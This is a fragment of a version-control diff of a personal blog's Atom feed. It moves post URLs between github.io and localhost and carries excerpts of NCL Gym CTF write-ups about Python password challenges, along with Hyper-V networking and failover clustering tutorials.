/><published>2018-04-02T21:13:00-04:00</published><updated>2018-04-02T21:13:00-04:00</updated><id>http://hiimzackjones.github.io/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON2</id><content type="html" xml:base="http://hiimzackjones.github.io/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON2.html">&lt;p&gt;So this challenge at first glance was intimidating. There was a bit more going on in this one. But always, always, always - code looks scarier than it actually is. But before we get into the code. The download was a .pyc file.&lt;/p&gt;
+&lt;p&gt;We can assume that the &lt;code&gt;/amagicbridgeappearsatthechasm&lt;/code&gt; is possibly a directory. Try going to the site by typing the host’s IP address and then going to the url. From there use your Web pentesting notes to search through possible directories, check pages that are hidden from Google’s web crawlers, test to see if it’s running off of Wordpress, etc. Take screenshots of your findings.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">Necromancer Notes Made for Intro for Cyber Security Class taught Spring 2019.</summary></entry><entry><title type="html">NCL Gym Exploitation ‘Python 2’</title><link href="http://localhost:4000/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON2.html" rel="alternate" type="text/html" title="NCL Gym Exploitation ‘Python 2’" /><published>2018-04-02T21:13:00-04:00</published><updated>2018-04-02T21:13:00-04:00</updated><id>http://localhost:4000/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON2</id><content type="html" xml:base="http://localhost:4000/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON2.html">&lt;p&gt;So this challenge at first glance was intimidating. There was a bit more going on in this one. But always, always, always - code looks scarier than it actually is. But before we get into the code. The download was a .pyc file.&lt;/p&gt;
 
 &lt;p&gt;Wut.&lt;/p&gt;
 
@@ -1268,7 +1477,7 @@ correct
 
 &lt;p&gt;-Cheers&lt;/p&gt;
 
-&lt;p&gt;Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">So this challenge at first glance was intimidating. There was a bit more going on in this one. But always, always, always - code looks scarier than it actually is. But before we get into the code. The download was a .pyc file.</summary></entry><entry><title type="html">NCL Gym Exploitation ‘Python 1’</title><link href="http://hiimzackjones.github.io/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON1.html" rel="alternate" type="text/html" title="NCL Gym Exploitation ‘Python 1’" /><published>2018-04-02T18:33:00-04:00</published><updated>2018-04-02T18:33:00-04:00</updated><id>http://hiimzackjones.github.io/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON1</id><content type="html" xml:base="http://hiimzackjones.github.io/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON1.html">&lt;h1 id=&quot;ncl-gym-2018---enumeration-and-exploitation-python-1&quot;&gt;NCL Gym 2018 - Enumeration and Exploitation Python 1&lt;/h1&gt;
+&lt;p&gt;Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">So this challenge at first glance was intimidating. There was a bit more going on in this one. But always, always, always - code looks scarier than it actually is. But before we get into the code. The download was a .pyc file.</summary></entry><entry><title type="html">NCL Gym Exploitation ‘Python 1’</title><link href="http://localhost:4000/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON1.html" rel="alternate" type="text/html" title="NCL Gym Exploitation ‘Python 1’" /><published>2018-04-02T18:33:00-04:00</published><updated>2018-04-02T18:33:00-04:00</updated><id>http://localhost:4000/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON1</id><content type="html" xml:base="http://localhost:4000/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON1.html">&lt;h1 id=&quot;ncl-gym-2018---enumeration-and-exploitation-python-1&quot;&gt;NCL Gym 2018 - Enumeration and Exploitation Python 1&lt;/h1&gt;
 
 &lt;p&gt;This flag is a Python password flag. Figure out what the password should be to satisfy the if statement. Easy.&lt;/p&gt;
 
@@ -1534,7 +1743,7 @@ correct
 
 &lt;p&gt;Cheers,&lt;/p&gt;
 
-&lt;p&gt;Zack&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">NCL Gym 2018 - Enumeration and Exploitation Python 1</summary></entry><entry><title type="html">Configuring Hyper V Networking</title><link href="http://hiimzackjones.github.io/server/2018/03/28/Configuring-Hyper-V-Networking.html" rel="alternate" type="text/html" title="Configuring Hyper V Networking" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://hiimzackjones.github.io/server/2018/03/28/Configuring-Hyper-V-Networking</id><content type="html" xml:base="http://hiimzackjones.github.io/server/2018/03/28/Configuring-Hyper-V-Networking.html">&lt;p&gt;Hyper-V has extensive software defined network capabilities allowing an admin to create elaboriate networking, isolating host VMs, Vlans, Link Aggregation, and Load Balancing.&lt;/p&gt;
+&lt;p&gt;Zack&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">NCL Gym 2018 - Enumeration and Exploitation Python 1</summary></entry><entry><title type="html">Configuring Hyper V Networking</title><link href="http://localhost:4000/server/2018/03/28/Configuring-Hyper-V-Networking.html" rel="alternate" type="text/html" title="Configuring Hyper V Networking" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://localhost:4000/server/2018/03/28/Configuring-Hyper-V-Networking</id><content type="html" xml:base="http://localhost:4000/server/2018/03/28/Configuring-Hyper-V-Networking.html">&lt;p&gt;Hyper-V has extensive software defined network capabilities allowing an admin to create elaboriate networking, isolating host VMs, Vlans, Link Aggregation, and Load Balancing.&lt;/p&gt;
 
 &lt;h3 id=&quot;basic-hyper-v-networking&quot;&gt;Basic Hyper-V Networking&lt;/h3&gt;
 
@@ -1581,7 +1790,7 @@ As you can see, there is a default switch, A switch with a custom name. And then
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/hyperVN/4.PNG&quot; alt=&quot;Nic Teaming&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;That’s the basics!&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Hyper-V has extensive software defined network capabilities allowing an admin to create elaboriate networking, isolating host VMs, Vlans, Link Aggregation, and Load Balancing.</summary></entry><entry><title type="html">Configuring Virtual Machine Settings</title><link href="http://hiimzackjones.github.io/server/2018/03/28/Configuring-Virtual-Machine-Settings.html" rel="alternate" type="text/html" title="Configuring Virtual Machine Settings" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://hiimzackjones.github.io/server/2018/03/28/Configuring-Virtual-Machine-Settings</id><content type="html" xml:base="http://hiimzackjones.github.io/server/2018/03/28/Configuring-Virtual-Machine-Settings.html">&lt;h2 id=&quot;setting-hyper-v-settings&quot;&gt;Setting Hyper-V settings&lt;/h2&gt;
+&lt;p&gt;That’s the basics!&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Hyper-V has extensive software defined network capabilities allowing an admin to create elaboriate networking, isolating host VMs, Vlans, Link Aggregation, and Load Balancing.</summary></entry><entry><title type="html">Configuring Virtual Machine Settings</title><link href="http://localhost:4000/server/2018/03/28/Configuring-Virtual-Machine-Settings.html" rel="alternate" type="text/html" title="Configuring Virtual Machine Settings" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://localhost:4000/server/2018/03/28/Configuring-Virtual-Machine-Settings</id><content type="html" xml:base="http://localhost:4000/server/2018/03/28/Configuring-Virtual-Machine-Settings.html">&lt;h2 id=&quot;setting-hyper-v-settings&quot;&gt;Setting Hyper-V settings&lt;/h2&gt;
 
 &lt;p&gt;Hyper-V settings can be adjusted for each VM and will in essence adjust the aspects of the VM that would usually be physical components.&lt;/p&gt;
 
@@ -1615,28 +1824,4 @@ As you can see, there is a default switch, A switch with a custom name. And then
   &lt;li&gt;Automatic start and stop of VM&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/hypervSet/2.PNG&quot; alt=&quot;Management Options&quot; /&gt;&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Setting Hyper-V settings</summary></entry><entry><title type="html">Implementing Failover Clustering</title><link href="http://hiimzackjones.github.io/server/2018/03/28/Implementing-Failover-Clustering.html" rel="alternate" type="text/html" title="Implementing Failover Clustering" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://hiimzackjones.github.io/server/2018/03/28/Implementing-Failover-Clustering</id><content type="html" xml:base="http://hiimzackjones.github.io/server/2018/03/28/Implementing-Failover-Clustering.html">&lt;h3 id=&quot;installing-the-failover-feature&quot;&gt;Installing the Failover Feature&lt;/h3&gt;
-&lt;p&gt;To add this feature, in Server Manager go to Manage and Add Roles and Features. From the Features list select &lt;em&gt;Failover Clustering&lt;/em&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;validate-cluster-configuration&quot;&gt;Validate Cluster Configuration&lt;/h3&gt;
-&lt;ul&gt;
-  &lt;li&gt;Go to Failover Clustering in the tools of Server Manager,&lt;/li&gt;
-  &lt;li&gt;on the right side there will be a Actions panel where you can select &lt;em&gt;Validate Configuration&lt;/em&gt;&lt;/li&gt;
-  &lt;li&gt;Add the names of the servers in the text boxes and continue&lt;/li&gt;
-  &lt;li&gt;then &lt;strong&gt;Run all Tests&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;This will check to make sure the inventory, the stroage, the system configs, and Hyper-V is setup and ready for Clustering. Errors will show up in the &lt;strong&gt;Failover Cluster Report&lt;/strong&gt;&lt;br /&gt;
-If there are any issues, use the report to help you sovle them before moving forward.&lt;/p&gt;
-
-&lt;h3 id=&quot;creating-a-cluster&quot;&gt;Creating a Cluster&lt;/h3&gt;
-&lt;ul&gt;
-  &lt;li&gt;In the same actions pane, click create new cluster&lt;/li&gt;
-  &lt;li&gt;select the first server and cluster and add&lt;/li&gt;
-  &lt;li&gt;Name the cluster and type the IP address of the Cluster that we set up previously.&lt;/li&gt;
-  &lt;li&gt;Finish&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Your cluster should show up in the Cluster’s tool section of the Server Manager.&lt;/p&gt;
-
-&lt;h3 id=&quot;adding-a-shared-drive-to-the-cluster-iscsi&quot;&gt;Adding a shared Drive to the Cluster (iSCSI)&lt;/h3&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Installing the Failover Feature To add this feature, in Server Manager go to Manage and Add Roles and Features. From the Features list select Failover Clustering</summary></entry></feed>
+&lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/hypervSet/2.PNG&quot; alt=&quot;Management Options&quot; /&gt;&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Setting Hyper-V settings</summary></entry></feed>
